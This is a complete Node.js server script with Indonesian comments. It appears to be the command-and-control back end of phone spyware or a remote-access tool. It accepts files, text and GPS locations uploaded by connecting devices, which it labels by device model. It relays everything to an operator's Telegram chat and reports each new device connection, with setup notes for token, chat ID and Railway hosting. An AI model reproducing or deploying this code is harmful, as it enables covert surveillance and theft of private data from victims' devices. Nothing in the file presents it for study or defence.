const express = require('express');
const http = require('http');
const ws = require('ws');
const multer = require('multer');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const uuid = require('uuid');

// GANTI dengan token bot & chat ID kamu
const token = 'ISI_TOKEN_BOT_MU';
const chatId = 'ISI_CHAT_ID_MU';

const app = express();
const server = http.createServer(app);
const wss = new ws.Server({ server });
const bot = new TelegramBot(token, { polling: true });

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
const upload = multer();

app.get('/', (req, res) => {
  res.send('<h1 align="center">✅ Server Berjalan</h1>');
});

app.post('/uploadFile', upload.single('file'), (req, res) => {
  const name = req.file.originalname;
  bot.sendDocument(chatId, req.file.buffer, {
    caption: `📎 File dari ${req.headers.model}`,
    filename: name
  });
  res.send('');
});

app.post('/uploadText', (req, res) => {
  bot.sendMessage(chatId, `📩 Pesan dari ${req.headers.model}:\n\n${req.body.text}`);
  res.send('');
});

app.post('/uploadLocation', (req, res) => {
  bot.sendLocation(chatId, req.body.lat, req.body.lon);
  bot.sendMessage(chatId, `📍 Lokasi dari ${req.headers.model}`);
  res.send('');
});

wss.on('connection', (socket, req) => {
  const id = uuid.v4();
  const model = req.headers.model || 'Unknown';
  bot.sendMessage(chatId, `🔗 Perangkat baru terhubung: ${model}`);
  
  socket.on('close', () => {
    bot.sendMessage(chatId, `❌ Koneksi terputus: ${model}`);
  });
});

// ✅ BAGIAN WAJIB UNTUK RAILWAY
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`✅ Server aktif di port ${PORT}`);
});
